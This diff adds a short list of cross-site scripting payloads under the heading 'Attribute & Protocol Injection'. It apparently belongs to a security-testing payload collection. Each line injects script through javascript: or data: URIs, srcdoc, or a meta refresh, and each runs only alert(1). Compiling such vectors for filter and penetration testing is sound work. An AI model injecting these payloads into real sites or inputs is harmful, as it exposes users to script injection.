@@ -1,0 +1,11 @@
+# Attribute & Protocol Injection
+<a href="javascript:alert(1)">Click Me</a>
+<iframe src="javascript:alert(1)"></iframe>
+<embed src="javascript:alert(1)">
+<object data="javascript:alert(1)"></object>
+<form action="javascript:alert(1)"><input type=submit></form>
+<isindex formaction="javascript:alert(1)" type=submit>
+<iframe srcdoc="<img src=x onerror=alert(1)>"></iframe>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click Me</a>
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
